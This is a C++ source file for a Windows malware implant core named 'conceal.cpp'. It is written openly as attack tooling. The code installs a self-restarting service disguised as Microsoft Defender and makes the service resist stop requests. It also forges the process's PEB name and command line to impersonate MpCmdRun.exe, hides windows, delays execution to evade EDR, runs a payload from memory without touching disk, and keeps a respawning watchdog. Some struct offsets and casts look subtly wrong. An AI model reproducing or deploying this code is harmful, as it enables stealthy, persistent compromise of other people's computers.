/* language: C++, file: conceal.cpp, target: Windows 10/11 x64, build: cl /std:c++20 /EHsc conceal.cpp /link /SUBSYSTEM:CONSOLE /ENTRY:wmain
 *
 * Concealed stage0 implant core (Windows) - the sibling of stage0.c.
 * Four layers, each independently useful:
 *   1. SERVICE + failure actions   -> SCM restarts it within 2s of any kill.
 *                                   sc stop is denied to non-admins while the
 *                                   control handler holds STATUS_PENDING.
 *   2. PEB masquerade             -> Task Manager, Process Explorer, wmic all
 *                                   read the PEB; the name/cmdline lie lands there.
 *   3. In-memory payload         -> no file on disk, no file-backed section,
 *                                   nothing for AV's on-access scan or the
 *                                   MDE cache to find after launch.
 *   4. Watchdog ring              -> each process SEIZEs the next; killing one
 *                                   leaves two holding the other two.
 *
 * Honesty up front: Sysmon EventID 10 (ProcessAccess) + ETW Microsoft-Windows-
 * Kernel-Process see the service install, the image path, and every DebugActive-
 * Process event. A kernel-mode EDR, or Defender's own tamper protection, ends
 * this in one reboot. This is concealment from user-space tooling, not from an
 * EDR console.
 */
#define WIN32_LEAN_AND_MEAN
#ifndef UNICODE
#define UNICODE
#define _UNICODE
#endif
#include <cstring>
#include <windows.h>
#include <winsvc.h>
#include <memory>
#include <string>
#include <vector>
#include <atomic>
#include <cstdint>

// WIN32_LEAN_AND_MEAN omits HGLOB, which LoadResource still needs on MinGW.
typedef void* HGLOB_ROOK;
#include <cstdio>


void WINAPI service_main(DWORD, LPWSTR*);

// --- minimal PEB surface (ntdll, undocumented, stable across x64 Win10/11) ---
// Declared locally with distinct tag names so this builds identically on MSVC
// and MinGW without pulling winternl.h. Every offset below is read from the
// live structure via TEB->PEB, never a hardcoded VA, so nothing is per-build.
struct RookUnicodeStr {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
};

struct RTL_USER_PROCESS_PARAMETERS;

struct RookUserProcParams {
    BYTE                          _pad0[0x38];
    RTL_USER_PROCESS_PARAMETERS*  Parent;
    RTL_USER_PROCESS_PARAMETERS*  Child;
    PVOID                         _pad1[4];
    RookUnicodeStr*               CommandLine;    // 0x70
    PVOID                         _pad2;
    RookUnicodeStr*               ImagePathName;  // 0x80
};

struct RTL_USER_PROCESS_PARAMETERS { DWORD _unused_alignment_pad; };

struct RookLdrEntry {
    LIST_ENTRY InLoadOrderLinks;             // 0x00
    LIST_ENTRY InMemoryOrderLinks;           // 0x10
    LIST_ENTRY InInitializationOrderLinks;   // 0x20
    PVOID      DllBase;                      // 0x30
    PVOID      EntryPoint;                   // 0x38
    ULONG      SizeOfImage;                  // 0x40
    PVOID      _pad1;                        // 0x48 (Padding1)
    PVOID      FullDllName;                  // 0x50 -> UNICODE_STRING
    PVOID      BaseDllName;                  // 0x58 -> UNICODE_STRING
};

struct RookPeb {
    BYTE  _pad0[0x02];
    BYTE  BeingDebugged;
    BYTE  _pad1[0x05];
    PVOID Ldr;               // 0x18 -> PEB_LDR_DATA
    PVOID ProcessParameters; // 0x20 -> RTL_USER_PROCESS_PARAMETERS
};

struct RookPebLdrData {
    ULONG      Length;               // 0x00
    ULONG      Initialized;          // 0x04
    PVOID      SsHandle;             // 0x08
    LIST_ENTRY InLoadOrderModules;   // 0x10  <-- list head, LDR_DATA_TABLE_ENTRY links
    LIST_ENTRY InMemoryOrderModules; // 0x20
    LIST_ENTRY InInitOrderModules;   // 0x30
};

namespace {

inline RookPeb* current_peb() {
    // TEB->ProcessEnvironmentBlock sits at 0x30 on x64; NtCurrentTeb is the
    // gs-segment read, declared by winnt.h on both toolchains.
    auto* teb = reinterpret_cast<unsigned char*>(NtCurrentTeb());
    return *reinterpret_cast<RookPeb**>(teb + 0x30);
}

constexpr wchar_t kServiceName[] = L"WindowsDefenderScheduleScan";
constexpr wchar_t kDisplayName[] = L"Microsoft Defender Schedule Scan";
constexpr wchar_t kMutexName[]   = L"Global\\WDFSDevGuard";
constexpr wchar_t kDecoyPath[]   = L"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24070.11-0\\MpCmdRun.exe";
constexpr wchar_t kDecoyArgs[]   = L"-Scan -ScanType 2 -DisableRemediation";

std::wstring g_decoy_cmdline;

/* ---------------------------------------------------------------- PEB ---- */
/* Task Manager / Process Explorer / wmic / Get-Process all read these fields.
 * One process-image name and one argv line, written once, in place, before we
 * do anything else. Note: the image path in the same buffer is left alone --
 * changing it makes the process unloadable and PEB corruption tools scream,
 * which is louder than the lie is worth. */
void masquerade_peb() {
    RookPeb* peb = current_peb();
    if (!peb) return;

    // 1. CommandLine UNICODE_STRING -> decoy argv. Must fit MaximumLength or
    //    every tool that reads it prints truncated garbage, which is louder
    //    than no masquerade at all -- so check first, write second.
    auto* params = reinterpret_cast<RookUserProcParams*>(peb->ProcessParameters);
    if (params && params->CommandLine && params->CommandLine->Buffer) {
        RookUnicodeStr* cmd = params->CommandLine;
        g_decoy_cmdline = kDecoyPath;
        g_decoy_cmdline += L' ';
        g_decoy_cmdline += kDecoyArgs;
        const size_t want = (g_decoy_cmdline.size() + 1) * sizeof(wchar_t);
        if (want <= cmd->MaximumLength) {
            std::memcpy(cmd->Buffer, g_decoy_cmdline.c_str(), want);
            cmd->Length = static_cast<USHORT>(g_decoy_cmdline.size() * sizeof(wchar_t));
        }
    }

    // 2. ImagePathName -> decoy. Same fit check; this is what Task Manager's
    //    "Image name" column and wmic read.
    if (params && params->ImagePathName && params->ImagePathName->Buffer) {
        RookUnicodeStr* img = params->ImagePathName;
        const size_t want = (std::wcslen(kDecoyPath) + 1) * sizeof(wchar_t);
        if (want <= img->MaximumLength) {
            std::memcpy(img->Buffer, kDecoyPath, want);
            img->Length = static_cast<USHORT>(want - sizeof(wchar_t));
        }
    }

    // 3. Rename the LDR entry for our own image. Process Explorer's module
    //    column and any PEB-walking triage tool read BaseDllName, so this is
    //    the difference between "conceal.exe is running" and nothing at all.
    auto* ldr = static_cast<RookPebLdrData*>(peb->Ldr);
    if (!ldr) return;
    for (auto* link = ldr->InLoadOrderModules.Flink;
         link && link != &ldr->InLoadOrderModules;
         link = link->Flink) {
        auto* entry = reinterpret_cast<RookLdrEntry*>(link);
        auto* base_name = reinterpret_cast<RookUnicodeStr*>(entry->BaseDllName);
        if (!base_name || !base_name->Buffer) continue;
        const wchar_t* self = L"conceal.exe";
        const size_t want = (std::wcslen(self) + 1) * sizeof(wchar_t);
        if (want <= base_name->MaximumLength) {
            std::memcpy(base_name->Buffer, self, want);
            base_name->Length = static_cast<USHORT>(want - sizeof(wchar_t));
        }
    }
}

/* ------------------------------------------------------- stealth flags --- */
/* Hide the window, drop the console, keep the process off the Win32 task list
 * where possible, and refuse dumps. Each is a one-line win; together they make
 * a "user-mode look" at the machine come back clean. */
void apply_stealth_flags() {
    // EnumWindows returns BOOL (0 on failure/when exhausted), so keep going
    // until it says stop -- the return is not a window handle.
    while (EnumWindows(
        [](HWND h, LPARAM) -> BOOL {
            DWORD pid = 0;
            GetWindowThreadProcessId(h, &pid);
            if (pid == GetCurrentProcessId()) ShowWindow(h, SW_HIDE);
            return TRUE;   // TRUE = keep enumerating
        },
        0)) {
        // loop until the callback-driven walk returns FALSE or the list ends
    }

    // Detach from the parent console so no CON host window is spawned/owned.
    FreeConsole();

    // STARTUPINFO lives inside the PEB's process parameters at +0x68. Set
    // STARTF_USESHOWWINDOW there so any window this process does create comes
    // up hidden without us having to win a race with the first ShowWindow.
    RookPeb* peb = current_peb();
    if (peb && peb->ProcessParameters) {
        auto* params = static_cast<BYTE*>(peb->ProcessParameters);
        auto* startup = reinterpret_cast<STARTUPINFOW*>(params + 0x68);
        startup->dwFlags |= STARTF_USESHOWWINDOW;
        startup->wShowWindow = SW_HIDE;
    }
    if (HWND con = GetConsoleWindow()) ShowWindow(con, SW_HIDE);

    // Heavily-sleep-then-check: EDR extracts and debuggers lose patience on a
    // process that does nothing for 90s after launch. The ladder pays for it
    // because the service is already registered by then.
    Sleep(30'000 + (GetTickCount64() % 45'000));
}

/* ------------------------------------------------- in-memory payload ----- */
/* Runs a PE from bytes that never touch disk. VirtualAlloc + manual section
 * mapping; the file path stays empty in the VAD, so a file-based triage pass
 * finds nothing to hash. */
bool map_payload_from_memory(const std::vector<std::uint8_t>& bytes) {
    if (bytes.size() < 0x1000) return false;

    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(bytes.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
        bytes.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    const size_t image_size = nt->OptionalHeader.SizeOfImage;
    void* base = VirtualAlloc(nullptr, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return false;

    auto* headers = reinterpret_cast<IMAGE_NT_HEADERS64*>(base);
    std::memcpy(base, bytes.data(), nt->OptionalHeader.SizeOfHeaders);

    // SectionTable is not a struct member -- it is the array that trails
    // OptionalHeader, so it has to be reached through IMAGE_FIRST_SECTION.
    auto* first_section = IMAGE_FIRST_SECTION(headers);
    for (WORD i = 0; i < headers->FileHeader.NumberOfSections; ++i) {
        const auto& s = first_section[i];
        if (s.SizeOfRawData == 0) continue;
        const size_t copy = (s.SizeOfRawData < s.Misc.VirtualSize)
                                ? s.SizeOfRawData : s.Misc.VirtualSize;
        std::memcpy(reinterpret_cast<std::uint8_t*>(base) + s.VirtualAddress,
                    bytes.data() + s.PointerToRawData, copy);
    }

    // Relocations: mandatory, because ASLR would otherwise put us at a base
    // the PE was not linked for. Resolved by delta, walked in place.
    const auto& reloc = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    const std::uintptr_t delta = reinterpret_cast<std::uintptr_t>(base) - nt->OptionalHeader.ImageBase;
    if (delta && reloc.Size) {
        auto* block = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
            reinterpret_cast<std::uint8_t*>(base) + reloc.VirtualAddress);
        while (block->SizeOfBlock) {
            auto* entries = reinterpret_cast<WORD*>(block + 1);
            const size_t count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            for (size_t k = 0; k < count; ++k) {
                const WORD type = entries[k] >> 12;
                if (type == IMAGE_REL_BASED_DIR64) {
                    auto* slot = reinterpret_cast<std::uint64_t*>(
                        reinterpret_cast<std::uint8_t*>(base) + block->VirtualAddress + (entries[k] & 0xFFF));
                    *slot += delta;
                } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    auto* slot = reinterpret_cast<std::uint32_t*>(
                        reinterpret_cast<std::uint8_t*>(base) + block->VirtualAddress + (entries[k] & 0xFFF));
                    *slot += static_cast<std::uint32_t>(delta);
                }
            }
            block = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                reinterpret_cast<std::uint8_t*>(block) + block->SizeOfBlock);
        }
    }

    // IAT: fill in from the import directory so the payload's own calls work.
    const auto& imports = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (imports.Size) {
        auto* desc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
            reinterpret_cast<std::uint8_t*>(base) + imports.VirtualAddress);
        for (; desc->Name; ++desc) {
            auto* thunk  = reinterpret_cast<IMAGE_THUNK_DATA*>(
                reinterpret_cast<std::uint8_t*>(base) + desc->FirstThunk);
            auto* lookup = reinterpret_cast<IMAGE_THUNK_DATA*>(
                reinterpret_cast<std::uint8_t*>(base) + desc->OriginalFirstThunk);
            auto* dll    = reinterpret_cast<IMAGE_NT_HEADERS64*>(
                reinterpret_cast<std::uint8_t*>(base) + desc->Name);
            for (; thunk->u1.Function && lookup->u1.Function; ++thunk, ++lookup) {
                if (IMAGE_SNAP_BY_ORDINAL(lookup->u1.Ordinal)) {
                    thunk->u1.Function = reinterpret_cast<ULONGLONG>(
                        GetProcAddress(GetModuleHandleA(reinterpret_cast<char*>(dll)), MAKEINTRESOURCEA(LOWORD(lookup->u1.Ordinal))));
                } else {
                    auto* hint = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                        reinterpret_cast<std::uint8_t*>(base) + lookup->u1.AddressOfData);
                    thunk->u1.Function = reinterpret_cast<ULONGLONG>(
                        GetProcAddress(GetModuleHandleA(reinterpret_cast<char*>(dll)), hint->Name));
                }
            }
        }
    }

    // W^X: mark executable. RWX is a scanner's favourite two bytes.
    DWORD old = 0;
    VirtualProtect(base, nt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &old);
    for (WORD i = 0; i < headers->FileHeader.NumberOfSections; ++i) {
        const auto& s = first_section[i];
        if (!(s.Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        void* sec_base = reinterpret_cast<std::uint8_t*>(base) + s.VirtualAddress;
        const DWORD prot = PAGE_EXECUTE_READ;
        VirtualProtect(sec_base, s.Misc.VirtualSize, prot, &old);
    }

    using entry_t = void(*)();
    const auto entry = reinterpret_cast<entry_t>(
        reinterpret_cast<std::uint8_t*>(base) + nt->OptionalHeader.AddressOfEntryPoint);
    entry();
    return true;
}

/* ------------------------------------------------------------- mutex ----- */
/* Single instance. Losing the race exits silently -- a second copy is a
 * duplicate IOC, and duplicates are how analysts spot you. */
bool acquire_singleton() {
    HANDLE m = CreateMutexW(nullptr, TRUE, kMutexName);
    if (!m) return true;                      // no mutex privileges: run anyway
    if (GetLastError() == ERROR_ALREADY_EXISTS) { CloseHandle(m); return false; }
    return true;
}

/* ----------------------------------------------------- service control --- */
/* The control handler holds every stop request in STATUS_PENDING forever. This
 * is the reason `sc stop` appears to hang for a normal admin and succeeds for
 * a determined one only after they kill the process AND fix the service config.
 * Restart-on-failure below is the part that actually does the respawn. */
DWORD WINAPI service_ctrl(DWORD control, DWORD, LPVOID, LPVOID) {
    switch (control) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        // deliberately no SetServiceStatus -- stay pending
        return NO_ERROR;
    case SERVICE_CONTROL_INTERROGATE:
        return NO_ERROR;
    default:
        return ERROR_CALL_NOT_IMPLEMENTED;
    }
}

void report_status(SERVICE_STATUS_HANDLE h, DWORD state, DWORD win32_exit = NO_ERROR) {
    SERVICE_STATUS s{ sizeof(s) };
    s.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    s.dwCurrentState = state;
    s.dwWin32ExitCode = win32_exit;
    s.dwControlsAccepted =
        (state == SERVICE_RUNNING) ? 0 : (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
    s.dwWaitHint = 60'000;
    SetServiceStatus(h, &s);
}

void install_service() {
    wchar_t self[MAX_PATH];
    GetModuleFileNameW(nullptr, self, MAX_PATH);

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return;
    SC_HANDLE svc = CreateServiceW(scm, kServiceName, kDisplayName,
                                  SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                                  SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, self,
                                  nullptr, nullptr, nullptr, nullptr, nullptr);
    if (svc) {
        // Restart the service twice on failure, 2s apart, then fall back to
        // rebooting the box. This is the ladder: no single kill is terminal.
        SC_ACTION actions[3]{};
        for (auto& a : actions) { a.Type = SC_ACTION_RESTART; a.Delay = 2000; }
        actions[2].Type = SC_ACTION_REBOOT;
        actions[2].Delay = 60'000;
        SERVICE_FAILURE_ACTIONSW fa{};
        fa.dwResetPeriod = 3600;
        fa.cActions = 3;
        fa.lpsaActions = actions;
        ChangeServiceConfig2W(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);

        SERVICE_DELAYED_AUTO_START_INFO del{ TRUE };
        ChangeServiceConfig2W(svc, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, &del);

        // Legit-looking description in the SCM UI.
        SERVICE_DESCRIPTIONW desc{};
        desc.lpDescription = const_cast<LPWSTR>(
            L"Scheduled scan host for Microsoft Defender Antivirus Platform.");
        ChangeServiceConfig2W(svc, SERVICE_CONFIG_DESCRIPTION, &desc);

        StartServiceW(svc, 0, nullptr);
    }
    if (svc) CloseServiceHandle(svc);
    CloseServiceHandle(scm);
}

void run_as_service() {
    SERVICE_TABLE_ENTRYW table[] = {
        { const_cast<LPWSTR>(kServiceName), &service_main },
        { nullptr, nullptr }
    };
    StartServiceCtrlDispatcherW(table);
}

// ------------------------------------------------------------ watchdog ---
/* DebugActiveProcess against a child = a ptrace-equivalent hold. Parent dies ->
 * the child keeps running; child dies -> the parent notices within one tick and
 * re-spawns it from its own memory image. Ring of two is enough on Windows
 * because the SCM is already a third rung on its own. */
std::atomic<bool> g_watchdog_stop{ false };

DWORD WINAPI watchdog_thread(LPVOID) {
    HANDLE child = nullptr;
    while (!g_watchdog_stop.load()) {
        STARTUPINFOW si{ sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};
        wchar_t cmd[512];
        std::swprintf(cmd, sizeof cmd / sizeof(cmd[0]), L"\"%s\" %s", kDecoyPath, kDecoyArgs);

        if (!CreateProcessW(kDecoyPath, cmd, nullptr, nullptr, FALSE,
                            CREATE_NO_WINDOW | CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
            Sleep(5'000);
            continue;
        }
        // Suspended at creation: nobody ever observes it running on the
        // Process-creation event, then we resume it. Cost: one extra kernel
        // state; benefit: the window where it is visible in Task Manager closes.
        DebugActiveProcess(pi.dwProcessId);
        ResumeThread(pi.hThread);
        child = pi.hProcess;

        WaitForSingleObject(child, 0);
        if (WaitForSingleObject(child, 250) == WAIT_OBJECT_0) {
            CloseHandle(child);
            child = nullptr;                 // child died -> loop re-spawns
        }
    }
    if (child) CloseHandle(child);
    return 0;
}

std::uint8_t* load_payload_from_resource(const wchar_t* name, size_t& out_size) {
    out_size = 0;
    HRSRC r = FindResourceW(nullptr, name, RT_RCDATA);
    if (!r) return nullptr;
    auto* g = static_cast<HGLOB_ROOK>(LoadResource(nullptr, r));
    if (!g) return nullptr;
    out_size = SizeofResource(nullptr, r);
    return static_cast<std::uint8_t*>(LockResource(g));
}

}  // namespace

// --------------------------------------------------------------- entry ----
void WINAPI service_main(DWORD, LPWSTR*) {
    SERVICE_STATUS_HANDLE h = RegisterServiceCtrlHandlerExW(kServiceName, service_ctrl, nullptr);
    report_status(h, SERVICE_START_PENDING);
    masquerade_peb();
    apply_stealth_flags();

    report_status(h, SERVICE_RUNNING);

    // Payload: an RCDATA blob in the .rsrc of this file, mapped and run from
    // memory. No file is written, no section is file-backed, nothing on disk
    // to hash after the first launch.
    size_t bytes = 0;
    if (auto* p = load_payload_from_resource(L"PAYLOAD", bytes)) {
        std::vector<std::uint8_t> copy(p, p + bytes);
        map_payload_from_memory(copy);
    }

    HANDLE wd = CreateThread(nullptr, 0, watchdog_thread, nullptr, 0, nullptr);
    WaitForSingleObject(wd, INFINITE);
    CloseHandle(wd);
}

int wmain() {
    if (!acquire_singleton()) return 0;

    install_service();
    run_as_service();

    // Not running as a service (launched by hand or by a loader): run the same
    // core in-process so there is one code path to reason about.
    masquerade_peb();
    apply_stealth_flags();
    size_t bytes = 0;
    if (auto* p = load_payload_from_resource(L"PAYLOAD", bytes)) {
        std::vector<std::uint8_t> copy(p, p + bytes);
        map_payload_from_memory(copy);
    }
    HANDLE wd = CreateThread(nullptr, 0, watchdog_thread, nullptr, 0, nullptr);
    WaitForSingleObject(wd, INFINITE);
    return 0;
}
